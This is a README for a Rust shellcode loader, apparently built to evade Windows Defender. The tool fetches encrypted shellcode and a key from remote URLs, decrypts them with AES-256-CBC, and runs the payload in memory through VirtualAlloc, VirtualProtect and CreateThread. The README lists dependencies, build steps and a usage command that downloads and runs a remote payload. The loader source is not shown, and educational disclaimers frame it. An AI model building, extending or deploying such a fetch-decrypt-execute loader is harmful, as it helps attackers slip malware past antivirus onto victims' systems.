# AES-256-CBC Shellcode Decryptor and Executor in Rust

This Rust application fetches encrypted shellcode and an encryption key from provided URLs, decrypts the shellcode using AES-256-CBC, and executes it in memory on Windows systems. It utilizes PBKDF2-inspired concepts and Windows API calls for memory allocation and execution. This project was inspired by foundational knowledge from *Gemini Cyber Security’s* video *["Getting Started with Rust - Bypass Windows Defender"](https://www.youtube.com/watch?v=o8af1KeMrRc&t=95s)*.

> **Note:** This tool is intended for educational and security research purposes only. Use responsibly and in compliance with applicable laws.

## Features
- **AES-256-CBC Decryption**: Decrypts shellcode using the AES-256 algorithm in CBC mode.
- **Remote File Fetching**: Retrieves encrypted shellcode and keys from HTTP URLs using `reqwest`.
- **In-Memory Execution**: Allocates memory and executes decrypted shellcode via Windows API calls (`VirtualAlloc`, `VirtualProtect`, `CreateThread`).
- **Zero-Initialized IV**: Uses a static IV for simplicity (not recommended for production use).

## Prerequisites
### 1. Rust Installation
Ensure Rust is installed. If needed, install it via Rustup:

```sh
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

### 2. Windows OS
This project utilizes Windows-specific APIs (`windows-sys`) and is not compatible with other operating systems.

### 3. Internet Access
Required to fetch encrypted shellcode and key from provided URLs.

## Building the Project
### 1. Clone the Repository
```sh
git clone <repository_url>
cd <repository_name>
```

### 2. Install Dependencies
Ensure your `Cargo.toml` includes the following dependencies:

```toml
[dependencies]
aes = "0.8"
block-modes = "0.8"
pbkdf2 = "0.12"
sha2 = "0.10"
hex = "0.4"
hmac = "0.12"
reqwest = { version = "0.11", features = ["blocking"] }
windows-sys = { version = "0.52", features = ["Win32_Foundation", "Win32_System_Memory", "Win32_System_Threading"] }
```

Then, build the project in release mode:

```sh
cargo build --release
```

The compiled binary will be located in the `target/release` directory.

## Usage
Run the application with the following command, providing URLs to the encrypted shellcode and the encryption key:

```sh
./target/release/rust -exec <shellcode_url> <key_url>
```

### Example:
```sh
./target/release/rust -exec http://example.com/encrypted_shellcode http://example.com/key
```

This will:
1. Fetch the encrypted shellcode and key from the specified URLs.
2. Decrypt the shellcode using AES-256-CBC with a zero-initialized IV.
3. Allocate executable memory, copy the decrypted shellcode, and execute it as a new thread.

If successful, the program will output:
```
Decryption and execution succeeded.
```

## Security Considerations
- **Static IV**: The IV is set to zero, which compromises security by making the encryption predictable. For real-world use, a cryptographically secure random IV should be used.
- **Key Management**: The key is fetched remotely but not validated. Ensure the key source is trusted and secure.
- **Shellcode Execution**: Executing arbitrary code in memory can be dangerous and should only be done in controlled environments.
- **Error Handling**: Basic error reporting is implemented, but robust error handling should be added for production use.

## Credits
This project was inspired by *[Gemini Cyber Security](https://www.youtube.com/@gemini_security)* and their video *"Getting Started with Rust - Bypass Windows Defender"*. Special thanks to them for their educational content that helped guide this development.

## License
This project is licensed under the **MIT License**. See the `LICENSE` file for details.

## Disclaimer
This tool is for educational and research purposes only. The author is not responsible for any misuse or damage caused by this software. Use it at your own risk and ensure compliance with all relevant laws and regulations.

